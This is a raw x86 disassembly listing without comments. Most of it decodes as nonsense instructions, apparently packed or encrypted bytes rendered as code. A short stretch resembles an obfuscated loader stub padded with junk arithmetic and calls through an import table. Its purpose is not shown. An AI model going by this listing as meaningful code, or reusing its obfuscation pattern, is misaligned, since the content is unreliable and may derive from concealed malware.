  402232:	xor    al,0xa1
  402234:	or     edi,eax
  402236:	dec    ebx
  402237:	pop    edi
  402238:	(bad)
  40223c:	jmp    0xcf6f:0x22b97537
  402243:	inc    eax
  402244:	adc    DWORD PTR [edx-0x6ffd30c5],ebp
  40224a:	inc    edx
  40224b:	fistp  WORD PTR [eax-0x29aa9e99]
  402251:	loope  0x402272
  402253:	outs   dx,BYTE PTR ds:[esi]
  402254:	and    ebp,DWORD PTR [esi-0x1b]
  402257:	repz aas 
  402259:	mov    ?,WORD PTR [eax+0x4dfdfb38]
  40225f:	pop    eax
  402260:	ins    DWORD PTR es:[edi],dx
  402261:	lods   al,BYTE PTR ds:[esi]
  402262:	aam    0x90
  402264:	cmp    esi,DWORD PTR [ebx+0x574e6594]
  40226a:	pop    ss
  40226b:	into   
  40226c:	loop   0x40221c
  40226e:	pop    ds
  40226f:	loopne 0x402259
  402271:	aas    
  402272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402273:	inc    esi
  402274:	mov    edx,0x2cd903f
  402279:	lahf   
  40227a:	call   0x29bd913d
  40227f:	lods   eax,DWORD PTR ds:[esi]
  402280:	jb     0x4022ba
  402282:	(bad)  
  402283:	push   edx
  402284:	jae    0x4022ab
  402286:	mov    ss,WORD PTR [edx]
  402288:	fwait
  402289:	or     cl,BYTE PTR [eax+edx*4-0x14]
  40228d:	or     edi,DWORD PTR [ebx+0x39]
  402290:	ret    
  402291:	add    si,WORD PTR [edx+0x7bbbfdda]
  402298:	mov    ds:0xc5b1032e,eax
  40229d:	daa    
  40229e:	jns    0x40230f
  4022a0:	imul   ebx,DWORD PTR [edx],0xeb952520
  4022a6:	pusha  
  4022a7:	adc    eax,0xce37c9a5
  4022ac:	hlt    
  4022ad:	mov    eax,ds:0xf0cb8812
  4022b2:	rcr    BYTE PTR [esi+0x1a],1
  4022b5:	int    0x8c
  4022b7:	sar    DWORD PTR [esi],1
  4022b9:	loopne 0x4022a2
  4022bb:	xchg   BYTE PTR [ebx+0x3a2bbd6d],bl
  4022c1:	inc    di
  4022c3:	bsf    eax,DWORD PTR [edx-0xbd8d457]
  4022ca:	fwait
  4022cb:	jnp    0x402321
  4022cd:	aaa    
  4022ce:	fwait
  4022cf:	sbb    eax,0x5bf9cfa8
  4022d4:	gs pop ebx
  4022d6:	pop    ecx
  4022d7:	addr16 pop esi
  4022d9:	push   eax
  4022da:	(bad)  
  4022dc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	and    ebp,DWORD PTR [eax+0x52]
  4022e1:	es push ebx
  4022e3:	es data16 mov bp,si
  4022e8:	and    dl,BYTE PTR [edi]
  4022ea:	xchg   BYTE PTR [edi+0x25],cl
  4022ed:	xchg   esp,eax
  4022ee:	push   esi
  4022ef:	add    ah,0x55
  4022f2:	iret   
  4022f3:	dec    edi
  4022f4:	int    0xa3
  4022f6:	mov    DWORD PTR [edx+0x67],edi
  4022f9:	loop   0x40230b
  4022fb:	mov    dl,0xab
  4022fd:	jns    0x40234a
  4022ff:	jo     0x40233e
  402301:	xchg   edx,eax
  402302:	pop    ebx
  402303:	iret   
  402304:	xor    eax,DWORD PTR [eax]
  402306:	clc    
  402307:	fistp  DWORD PTR [edx-0x76c52698]
  40230d:	ror    BYTE PTR [eax+0x17375146],1
  402313:	push   ds
  402314:	and    cl,bh
  402316:	(bad)  
  402317:	mov    cl,0xd3
  402319:	js     0x4022a4
  40231b:	aad    0x90
  40231d:	mov    bl,0xba
  40231f:	jge    0x4022bb
  402321:	xchg   DWORD PTR [edi+0x2],ecx
  402324:	aam    0x14
  402326:	mov    BYTE PTR ds:0xf511ea5e,dl
  40232c:	aam    0x9a
  40232e:	test   DWORD PTR [eax-0x69],esi
  402331:	popa   
  402332:	push   ebx
  402333:	sbb    DWORD PTR [ebx],esp
  402335:	rol    BYTE PTR [ebp-0x43],0x3
  402339:	test   BYTE PTR ds:0x81634c75,0xc5
  402340:	pop    eax
  402341:	sub    dl,cl
  402343:	shl    DWORD PTR [edx],0x66
  402346:	sub    ebp,DWORD PTR [ebp+0x19]
  402349:	mov    ebx,0xfc9dff7d
  40234e:	and    esi,DWORD PTR [edi]
  402350:	or     DWORD PTR [ecx],ebp
  402352:	in     eax,0x43
  402354:	inc    ebx
  402355:	jno    0x4022f6
  402357:	pop    esp
  402358:	shr    DWORD PTR [eax],1
  40235a:	pop    ebx
  40235b:	inc    eax
  40235c:	pop    es
  40235d:	test   BYTE PTR [ebp+0x3e],al
  402360:	in     al,0x35
  402362:	dec    esp
  402363:	ret    
  402364:	pushf  
  402365:	imul   esi,DWORD PTR [eax],0x161248ca
  40236b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236c:	mov    esp,0xe27d53c4
  402371:	loopne 0x4023c7
  402373:	out    0xa2,eax
  402375:	add    DWORD PTR [ecx-0x1774e330],ebx
  40237b:	in     al,dx
  40237c:	jb     0x4023fb
  40237e:	and    BYTE PTR [edi+0x4a9b6f64],dl
  402384:	mov    esi,0xdd05fe8c
  402389:	jns    0x4023f6
  40238b:	dec    edx
  40238c:	xor    ecx,ebx
  40238e:	add    BYTE PTR [eax+0x16d9bf11],ch
  402394:	or     eax,0x47965602
  402399:	in     al,0x3b
  40239b:	(bad)  
  40239c:	ss push edi
  40239e:	loop   0x4023f8
  4023a0:	out    dx,eax
  4023a1:	cdq    
  4023a2:	cli    
  4023a3:	ror    DWORD PTR [ebx],0x2
  4023a6:	mov    bh,0x42
  4023a8:	push   es
  4023a9:	(bad)  
  4023aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ab:	jp     0x4023a9
  4023ad:	ja     0x402379
  4023af:	stc    
  4023b0:	call   0x54c11d96
  4023b5:	imul   esi,DWORD PTR [ebp-0x76],0x33856663
  4023bc:	outs   dx,DWORD PTR ds:[esi]
  4023bd:	cmp    al,0xd2
  4023bf:	sub    dh,BYTE PTR [eax+0x3bf4d4e7]
  4023c5:	ins    BYTE PTR es:[edi],dx
  4023c6:	addr16 sbb eax,0xf25840e7
  4023cc:	jp     0x40243f
  4023ce:	jecxz  0x402417
  4023d0:	cmp    dh,BYTE PTR [ebx-0x61]
  4023d3:	cmp    eax,0xcee820d
  4023d8:	data16 daa 
  4023da:	idiv   BYTE PTR [ebp+0x2f]
  4023dd:	into   
  4023de:	mov    edx,0xfb4409b8
  4023e3:	xlat   BYTE PTR ds:[ebx]
  4023e4:	dec    edi
  4023e5:	xchg   edi,eax
  4023e6:	or     eax,0xd11834c9
  4023eb:	in     eax,0x51
  4023ed:	xor    BYTE PTR [eax+esi*8-0x34691cd2],al
  4023f4:	ret    
  4023f5:	shl    BYTE PTR [edi+0x68],0x28
  4023f9:	ficom  WORD PTR [edx+0x56]
  4023fc:	mov    edx,0xb8e4ab89
  402401:	imul   eax,DWORD PTR [esi-0x3342e0e8],0x3a
  402408:	in     al,0x78
  40240a:	sub    BYTE PTR [esp+edi*4-0x74a90adb],bh
  402411:	outs   dx,BYTE PTR ds:[esi]
  402412:	xchg   esi,eax
  402413:	int    0xc1
  402415:	loop   0x402483
  402417:	adc    bl,BYTE PTR [eax-0x4b587d88]
  40241d:	push   0x15dbaf58
  402422:	neg    ch
  402424:	xor    cl,BYTE PTR [esp+ecx*8]
  402427:	shl    esi,0x54
  40242a:	adc    eax,0x62f664da
  40242f:	cmc    
  402430:	jnp    0x402403
  402432:	mov    BYTE PTR ds:0x6b609d31,bh
  402438:	mov    WORD PTR [ebp+0x6ebf1dbb],?
  40243e:	pop    edi
  40243f:	data16 mov al,0x70
  402442:	stos   BYTE PTR es:[edi],al
  402443:	adc    dh,ch
  402445:	dec    esi
  402446:	mov    bh,0xec
  402448:	aad    0xd1
  40244a:	leave  
  40244b:	or     DWORD PTR [eax+0x1670c0d9],eax
  402451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402452:	aam    0x28
  402454:	mov    eax,0x3197034
  402459:	adc    bl,BYTE PTR [eax+0x54]
  40245c:	sub    DWORD PTR [ebx+0x15],esp
  40245f:	(bad)  
  402460:	xor    eax,ebx
  402462:	adc    eax,DWORD PTR [ebx]
  402464:	jo     0x4024b9
  402466:	push   cs
  402467:	mov    edi,0x4c5cdc9d
  40246c:	add    DWORD PTR [esp+eax*2+0x283d6388],0xffffffb1
  402474:	sbb    DWORD PTR [esp+ebp*4],0x41
  402478:	and    ch,BYTE PTR [edx-0x6e]
  40247b:	sub    BYTE PTR [eax+0x13f6d437],bl
  402481:	leave  
  402482:	jb     0x4024d8
  402484:	aam    0xed
  402486:	sbb    eax,0x5e67208
  40248b:	mov    ebp,0xfd725174
  402490:	les    ebp,FWORD PTR [edi]
  402492:	mov    ah,0x19
  402494:	enter  0xa0c8,0x34
  402498:	dec    ecx
  402499:	lea    edx,[esi-0x6f]
  40249c:	dec    esp
  40249d:	inc    BYTE PTR [ebx-0x1b]
  4024a0:	sbb    BYTE PTR [ebx+0x1b],ch
  4024a3:	mov    ds:0xc14d8a2d,eax
  4024a8:	jmp    0x267d0cc8
  4024ad:	enter  0xeae5,0xa4
  4024b1:	jns    0x402452
  4024b3:	arpl   bp,dx
  4024b5:	fs int 0xc9
  4024b8:	and    eax,DWORD PTR [edi]
  4024ba:	xor    BYTE PTR [eax],al
  4024bc:	loopne 0x40246f
  4024be:	xor    ebp,DWORD PTR [eax+0x388ce1ea]
  4024c4:	loopne 0x402513
  4024c6:	inc    eax
  4024c7:	mov    ds:0xce226536,eax
  4024cc:	mov    bh,0x99
  4024ce:	imul   ebx,DWORD PTR [edi+edx*2+0x3c47f935],0xffffffdf
  4024d6:	jmp    0xe176b06f
  4024db:	test   al,0xdc
  4024dd:	out    0x9,eax
  4024df:	test   al,0xd3
  4024e1:	les    edi,FWORD PTR [eax+0x6c]
  4024e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e5:	mov    eax,ds:0x2ba4848c
  4024ea:	dec    eax
  4024eb:	sbb    BYTE PTR [ecx-0x6e],al
  4024ee:	inc    ebx
  4024ef:	lds    edi,FWORD PTR [edx-0x7a]
  4024f2:	retf   
  4024f3:	xor    eax,0xb2b3cad7
  4024f8:	mov    eax,ds:0x4a916385
  4024fd:	jmp    0x3161:0x389e33ae
  402504:	push   es
  402505:	push   ebx
  402506:	jo     0x402573
  402508:	je     0x40248b
  40250a:	stos   BYTE PTR es:[edi],al
  40250b:	pop    edx
  40250c:	xchg   esp,eax
  40250d:	bound  eax,QWORD PTR [ecx]
  40250f:	push   edi
  402510:	jmp    0x7575:0x3bd68cb4
  402517:	jb     0x402504
  402519:	mov    eax,?
  40251b:	int    0x72
  40251d:	mov    eax,0x5b0453bb
  402522:	les    eax,FWORD PTR [edx]
  402524:	sahf   
  402525:	or     ah,BYTE PTR [esi-0x48cc1a36]
  40252b:	xchg   ecx,eax
  40252c:	shl    BYTE PTR [ebp-0x3c],cl
  40252f:	stc    
  402530:	cmc    
  402531:	push   ecx
  402532:	mov    ebx,DWORD PTR [edi-0x1d]
  402535:	fbstp  TBYTE PTR [ebx+0x6b4d6904]
  40253b:	cwde   
  40253c:	fisttp WORD PTR [ebp-0x4a]
  40253f:	adc    BYTE PTR [di],dl
  402542:	fbstp  TBYTE PTR [edx+ecx*8]
  402545:	or     ebx,edx
  402547:	add    eax,DWORD PTR [esi-0x58]
  40254a:	in     al,dx
  40254b:	push   0xffffffda
  40254d:	pop    esp
  40254e:	cmp    al,0xa4
  402550:	repz pop esi
  402552:	fistp  DWORD PTR [eax+0x36]
  402555:	test   BYTE PTR [edx+0xafee8d6],bh
  40255b:	xor    eax,DWORD PTR [ebx-0x29de868d]
  402561:	outs   dx,BYTE PTR ds:[esi]
  402562:	(bad)  
  402563:	sub    DWORD PTR [esi-0x4f0c5f2],ecx
  402569:	cwde   
  40256a:	pop    eax
  40256b:	rcl    ah,0x18
  40256e:	mov    dh,0x36
  402570:	jp     0x402565
  402572:	into   
  402573:	mov    ds:0xdcdaf667,eax
  402578:	rcl    BYTE PTR [ebp-0x5a7fde48],cl
  40257e:	daa    
  40257f:	xchg   ebx,eax
  402580:	xchg   ebp,eax
  402581:	adc    DWORD PTR [edx+0x482d715e],esi
  402587:	and    eax,0x697a5368
  40258c:	pop    esi
  40258d:	loop   0x402607
  40258f:	out    dx,eax
  402590:	lock ins DWORD PTR es:[edi],dx
  402592:	push   edx
  402593:	dec    ecx
  402594:	push   ss
  402595:	mov    ebx,0x26467cb0
  40259a:	ret    0xf977
  40259d:	inc    edx
  40259e:	add    BYTE PTR [edx],al
  4025a0:	jbe    0x40253d
  4025a2:	pop    ebp
  4025a3:	ret    
  4025a4:	lds    edi,FWORD PTR [edi]
  4025a6:	and    DWORD PTR [edi+0x6cd1d6eb],ebx
  4025ac:	ja     0x4025d0
  4025ae:	lods   al,BYTE PTR ds:[esi]
  4025af:	mov    dl,0x1a
  4025b1:	and    ebp,DWORD PTR [edi]
  4025b3:	(bad)  
  4025b4:	mov    ebp,0x5f5dfdcc
  4025b9:	pop    ds
  4025ba:	int    0x52
  4025bc:	aas    
  4025bd:	jecxz  0x4025c7
  4025bf:	adc    eax,0x2b6e8242
  4025c4:	mov    al,0xcd
  4025c6:	in     al,dx
  4025c7:	sbb    edi,edx
  4025c9:	fidivr DWORD PTR [ebx-0x38010474]
  4025cf:	inc    ebp
  4025d0:	nop
  4025d1:	jb     0x40260e
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	movzx  eax,WORD PTR ds:0x4282df
  4025dc:	adc    DWORD PTR ds:0x42816b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428153,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428147,0x0
  4025fd:	mov    DWORD PTR ds:0x4282f3,0x76b5
  402607:	mov    DWORD PTR ds:0x42814f,edx
  40260d:	mov    DWORD PTR ds:0x428267,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428253
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428147,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42821f
  402645:	call   DWORD PTR ds:0x428d7c
  40264b:	sbb    DWORD PTR ds:0x42836b,0x36f
  402655:	adc    DWORD PTR ds:0x4282ef,0x428177
  40265f:	sub    DWORD PTR ds:0x42835f,0x4282fb
  402669:	and    DWORD PTR ds:0x42813f,0x42822b
  402673:	add    DWORD PTR ds:0x4282ff,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428147
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42813b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42826f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282cf,edx
  4026bd:	mov    DWORD PTR ds:0x42822b,ecx
  4026c3:	mov    DWORD PTR ds:0x428153,edx
  4026c9:	mov    DWORD PTR ds:0x42824f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42813b
  4026dd:	mov    DWORD PTR ds:0x42826f,edx
  4026e3:	cmp    DWORD PTR ds:0x42826f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428d80
  402708:	add    DWORD PTR ds:0x428277,0x4282d7
  402712:	sub    DWORD PTR ds:0x4282f3,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42814b,0x16a6
  402726:	dec    DWORD PTR ds:0x428167
  40272c:	and    DWORD PTR ds:0x42824b,edx
  402732:	or     DWORD PTR ds:0x4282db,edx
  402738:	mov    eax,ds:0x42816f
  40273d:	and    DWORD PTR ds:0x428383,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x428383
  402751:	sbb    DWORD PTR ds:0x42824f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42822f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x4282e3
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x43b67baa
  4027a0:	push   0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    bh,dh
  4027aa:	arpl   ax,cx
  4027ac:	mov    BYTE PTR es:[esi-0x507fbe38],0xd8
  4027b4:	int3   
  4027b5:	and    DWORD PTR [edi+0x7209ea1e],edx
  4027bb:	jecxz  0x40283a
  4027bd:	test   BYTE PTR [edx],0xd3
  4027c0:	adc    DWORD PTR [ecx],edx
  4027c2:	in     eax,0x76
  4027c4:	xor    BYTE PTR [ebx],ch
  4027c6:	and    bh,dl
  4027c8:	cdq    
  4027c9:	dec    esi
  4027ca:	cmp    edx,DWORD PTR ds:0x3bca6baa
  4027d0:	sti    
  4027d1:	rcr    edx,cl
  4027d3:	sbb    BYTE PTR [ebx-0x61],0x51
  4027d7:	xor    eax,0xd0068a19
  4027dc:	test   BYTE PTR [edi+0x5a],ah
  4027df:	imul   ebp,DWORD PTR [esi-0x22],0xf5624dd
  4027e6:	mov    eax,ds:0x786c712d
  4027eb:	add    eax,0xe2a51da9
  4027f0:	mov    ds:0x4a0531f5,al
  4027f5:	mov    ds:0xdbd21849,eax
  4027fa:	lahf   
  4027fb:	nop
  4027fc:	sbb    al,0x7d
  4027fe:	cmc    
  4027ff:	add    bh,BYTE PTR [edx]
  402801:	xchg   esp,eax
  402802:	sahf   
  402803:	dec    eax
  402804:	fld    DWORD PTR [edi-0x47]
  402807:	dec    ebx
  402808:	(bad)  
  402809:	sbb    BYTE PTR [ebp-0x17],ah
  40280c:	scas   al,BYTE PTR es:[edi]
  40280d:	mov    eax,0xba93cd81
  402812:	out    dx,eax
  402813:	mov    eax,0x86a34d0b
  402818:	stos   DWORD PTR es:[edi],eax
  402819:	cli    
  40281a:	jecxz  0x4027af
  40281c:	hlt    
  40281d:	inc    ebx
  40281e:	ficom  DWORD PTR [eax]
  402820:	and    BYTE PTR [eax],dl
  402822:	out    dx,al
  402823:	fsub   QWORD PTR [ecx+0x73]
  402826:	mov    ecx,0x99ed36b2
  40282b:	add    esi,DWORD PTR [ecx-0x6a]
  40282e:	dec    ecx
  40282f:	rcr    edx,0xea
  402832:	popa   
  402833:	cli    
  402834:	and    edi,ecx
  402836:	push   ss
  402837:	dec    ebx
  402838:	jmp    0x7864:0xdf8c1f3c
  40283f:	pop    es
  402840:	rol    DWORD PTR [edx+0x6855179],1
  402846:	add    esi,DWORD PTR [eax+0x2abda2f3]
  40284c:	sub    al,0x1a
  40284e:	xor    ah,BYTE PTR [eax+0x7b65272c]
  402854:	xor    BYTE PTR [ebp-0x54],0xea
  402858:	mov    eax,0x2c6fe7e2
  40285d:	gs ret 0x43ce
  402861:	mov    ecx,0x80d226db
  402866:	scas   al,BYTE PTR es:[edi]
  402867:	sahf   
  402868:	xchg   ebx,eax
  402869:	loopne 0x4028c4
  40286b:	cmp    dh,BYTE PTR [esi+0x44]
  40286e:	imul   ebp,DWORD PTR [ebp-0x4e0b53f1],0x13
  402875:	xchg   DWORD PTR [edx],esp
  402877:	das    
  402878:	xchg   BYTE PTR [ebx+0x4c],dh
  40287b:	mov    dh,0x6d
  40287d:	call   0x55f9:0x553061d3
  402884:	icebp  
  402885:	sub    al,0x5a
  402887:	sbb    BYTE PTR [ebp+0x50],ah
  40288a:	outs   dx,BYTE PTR ds:[esi]
  40288b:	out    0x15,al
  40288d:	jae    0x4028d8
  40288f:	in     al,0xfe
  402891:	sub    bl,BYTE PTR [ecx+0x22258554]
  402897:	lfs    ebp,FWORD PTR [eax-0x77]
  40289b:	jmp    0x40287d
  40289d:	(bad)  
  40289e:	(bad)  
  40289f:	sti    
  4028a0:	pop    ecx
  4028a1:	xchg   esi,eax
  4028a2:	repz mov bh,0x5b
  4028a5:	in     al,0xd8
  4028a7:	add    DWORD PTR [edi],edi
  4028a9:	lahf   
  4028aa:	inc    ecx
  4028ab:	xchg   esp,eax
  4028ac:	test   al,0xc6
  4028ae:	je     0x4028c9
  4028b0:	int3   
  4028b1:	dec    edi
  4028b2:	sub    DWORD PTR [eax+0x62ad0d3a],0x1e687e06
  4028bc:	aam    0x84
  4028be:	or     bl,cl
  4028c0:	xchg   esi,eax
  4028c1:	jne    0x4028af
  4028c3:	and    eax,0xfb7e3ad8
  4028c8:	jns    0x4028fc
  4028ca:	leave  
  4028cb:	push   esp
  4028cc:	inc    edi
  4028cd:	gs inc esp
  4028cf:	mov    al,0xfc
  4028d1:	mov    ecx,0x48157248
  4028d6:	(bad)  
  4028d8:	xchg   esp,eax
  4028d9:	pop    es
  4028da:	cmp    ah,BYTE PTR [eax-0x78]
  4028dd:	sub    al,0xab
  4028df:	jecxz  0x40291b
  4028e1:	imul   esp,DWORD PTR [ebx-0x6a],0xffffffc7
  4028e5:	ja     0x4028bc
  4028e7:	loope  0x40295a
  4028e9:	fistp  DWORD PTR [ebp+0x44e2db6a]
  4028ef:	loopne 0x4028b2
  4028f1:	sbb    edx,ebp
  4028f3:	sub    ecx,ebx
  4028f5:	(bad)  [ecx]
  4028f7:	imul   edx,DWORD PTR [ecx-0x53e3d59],0x5e
  4028fe:	call   0xfb2abeef
  402903:	frstor [ecx]
  402905:	ret    0x63c4
  402908:	adc    al,0xf9
  40290a:	inc    ebp
  40290b:	(bad)  
  40290c:	fcmovbe st,st(6)
  40290e:	xchg   ecx,eax
  40290f:	ins    BYTE PTR es:[edi],dx
  402910:	sub    DWORD PTR [esi-0x1ec00f56],0x7a
  402917:	cs sub esi,eax
  40291a:	mov    ch,0xed
  40291c:	push   eax
  40291d:	xor    BYTE PTR [edi+0x19],0x2e
  402921:	pop    ecx
  402922:	or     ecx,DWORD PTR [edx]
  402924:	add    cl,BYTE PTR [eax-0x39]
  402927:	scas   al,BYTE PTR es:[edi]
  402928:	ins    DWORD PTR es:[edi],dx
  402929:	sbb    BYTE PTR [ebp+0xc],0x0
  40292d:	mov    bh,0xc2
  40292f:	adc    BYTE PTR [ebp-0x17c2b8af],dh
  402935:	clc    
  402936:	addr16 out 0x97,eax
  402939:	adc    bl,dl
  40293b:	cmc    
  40293c:	ror    DWORD PTR [edi],0x38
  40293f:	mov    edx,0xa18d51d8
  402944:	or     ebp,ebx
  402946:	mov    bh,0x8f
  402948:	addr16 dec ebp
  40294a:	dec    ebx
  40294b:	fistp  QWORD PTR [ebx]
  40294d:	xchg   edx,eax
  40294e:	mov    eax,ds:0xd2e5f5c6
  402953:	add    DWORD PTR [ebx+0x3611cf2],esp
  402959:	pop    ds
  40295a:	dec    esi
  40295b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40295c:	jge    0x4029d8
  40295e:	and    al,0x28
  402960:	sbb    DWORD PTR [eax+0x60],esi
  402963:	ins    DWORD PTR es:[edi],dx
  402964:	cmovl  ecx,esi
  402967:	(bad)  
  402968:	xchg   ebp,eax
  402969:	ret    0x450d
  40296c:	pop    ebp
  40296d:	pop    esp
  40296e:	and    esi,DWORD PTR [esi+0x562b055a]
  402974:	cmp    al,0x45
  402976:	cwde   
  402977:	sub    edx,0x9df8b0cf
  40297d:	es cdq 
  40297f:	adc    ch,dh
  402981:	sub    ebp,esi
  402983:	jb     0x4029d7
  402985:	add    BYTE PTR ss:[esi-0x199dedba],bl
  40298c:	lds    ecx,FWORD PTR [ecx-0x61]
  40298f:	mov    edx,0x2e4a2e21
  402994:	loopne 0x40293a
  402996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402997:	lahf   
  402998:	xchg   ebx,eax
  402999:	in     al,dx
  40299a:	sub    eax,0xdb324c78
  40299f:	inc    edi
  4029a1:	fstp   TBYTE PTR [ecx-0x2431bc25]
  4029a7:	sbb    al,0x4b
  4029a9:	push   cs
  4029aa:	mov    dh,0xfc
  4029ac:	cdq    
  4029ad:	cmp    al,0xf2
  4029af:	mov    edx,0x98248ba2
  4029b4:	call   0x7e91:0xa38b865
  4029bb:	repz cmp al,0xb4
  4029be:	and    edi,eax
  4029c0:	sub    eax,0xdc1e6a67
  4029c5:	xchg   BYTE PTR [ebp+ecx*1-0x4f02a833],cl
  4029cc:	(bad)  
  4029cd:	mov    ch,0xe2
  4029cf:	jg     0x402a10
  4029d1:	xchg   ebx,eax
  4029d2:	push   ebp
  4029d3:	cld    
  4029d4:	rcl    DWORD PTR [ecx],1
  4029d6:	aad    0x6a
  4029d8:	shl    al,1
  4029da:	cli    
  4029db:	inc    edi
  4029dc:	push   ecx
  4029dd:	call   0x11b5ca10
  4029e2:	add    ebp,DWORD PTR ds:0x33a6ff55
  4029e8:	hlt    
  4029e9:	iret   
  4029ea:	aad    0x58
  4029ec:	xor    bh,BYTE PTR [eax+0x12505944]
  4029f2:	mov    ds:0x2b1b1366,al
  4029f7:	arpl   WORD PTR [edi+0x10ce9aeb],dx
  4029fd:	mov    bl,0xdc
  4029ff:	mov    bh,0xdb
  402a01:	mov    ah,0x78
  402a03:	jge    0x402a27
  402a05:	popa   
  402a06:	push   es
  402a07:	xchg   ebp,eax
  402a08:	nop
  402a09:	popa   
  402a0a:	mov    dl,0xa5
  402a0c:	mov    cl,0x34
  402a0e:	fsub   DWORD PTR [ebx+0x6d62660]
  402a14:	mov    fs,esp
  402a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a17:	fdivr  st,st(1)
  402a19:	test   BYTE PTR [edi-0x16],bl
  402a1c:	mov    dl,0x98
  402a1e:	jns    0x402a0a
  402a20:	gs call 0x7ed697d7
  402a26:	outs   dx,DWORD PTR ds:[esi]
  402a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a28:	jbe    0x402a37
  402a2a:	or     eax,DWORD PTR [ebp+0x581b6ab9]
  402a30:	iret   
  402a31:	jp     0x402a51
  402a33:	not    DWORD PTR [ebp+0x2d2498ce]
  402a39:	jmp    0x7f2174
  402a3e:	std    
  402a3f:	std    
  402a40:	or     DWORD PTR [edx-0x57],ecx
  402a43:	jnp    0x4029db
  402a45:	jl     0x402abc
  402a47:	dec    ebx
  402a48:	mov    ds:0x4fbe9242,al
  402a4d:	mov    ebp,0x929b1c33
  402a52:	sub    esp,DWORD PTR [edi]
  402a54:	call   0x15cd3db3
  402a59:	jmp    0x402a5d
  402a5b:	adc    DWORD PTR [edi-0x60],ecx
  402a5e:	aas    
  402a5f:	push   eax
  402a60:	sbb    DWORD PTR [eax-0x36],0xffffffc6
  402a64:	call   0x9d1d0779
  402a69:	dec    edi
  402a6a:	lods   al,BYTE PTR ds:[esi]
  402a6b:	add    BYTE PTR [ebx],bh
  402a6d:	ds pusha 
  402a6f:	sti    
  402a70:	fsub   QWORD PTR [edx+0x638159da]
  402a76:	ja     0x402a0e
  402a78:	adc    BYTE PTR [edi+esi*1-0x2bc0f8f5],dh
  402a7f:	adc    eax,0x81f77ed8
  402a84:	retf   0xf377
  402a87:	(bad)  
  402a88:	mov    al,0x63
  402a8a:	sub    cl,BYTE PTR [ebx]
  402a8c:	in     al,0x34
  402a8e:	(bad)  
  402a8f:	fild   DWORD PTR [edx-0x7e]
  402a92:	xchg   BYTE PTR [eax+0x41e0b8c4],ch
  402a98:	sub    edx,ebp
  402a9a:	dec    ecx
  402a9b:	cmp    ah,cl
  402a9d:	test   al,0xf5
  402a9f:	sbb    DWORD PTR [eax-0x75],ecx
  402aa2:	icebp  
  402aa3:	mov    ebp,0xe6a6ef8e
  402aa8:	xchg   ebx,eax
  402aa9:	fdiv   st,st(5)
  402aab:	ds test edx,ecx
  402aae:	out    dx,al
  402aaf:	stc    
  402ab0:	outs   dx,DWORD PTR ds:[esi]
  402ab1:	stc    
  402ab2:	mov    esi,0xa341ce08
  402ab7:	stc    
  402ab8:	fbstp  TBYTE PTR fs:[ecx-0x65c8d1b1]
  402abf:	cdq    
  402ac0:	push   esp
  402ac1:	push   ss
  402ac2:	xlat   BYTE PTR ds:[ebx]
  402ac3:	mov    DWORD PTR [eax+0x26],ebx
  402ac6:	retf   
  402ac7:	sub    BYTE PTR [esi+edi*1+0x4a],bl
  402acb:	mov    ah,0xf7
  402acd:	outs   dx,DWORD PTR ds:[esi]
  402ace:	in     al,0x4
  402ad0:	out    dx,eax
  402ad1:	mov    ecx,0x97367383
  402ad6:	jo     0x402a5b
  402ad8:	push   ds
  402ad9:	cmp    BYTE PTR [edi-0x26b3b5fa],al
  402adf:	scas   eax,DWORD PTR es:[edi]
  402ae0:	sbb    BYTE PTR [edi+0x8],dl
  402ae3:	xor    bl,BYTE PTR [eax]
  402ae5:	jg     0x402abd
  402ae7:	lahf   
  402ae8:	aam    0x7c
  402aea:	cmp    eax,0x6cf787e1
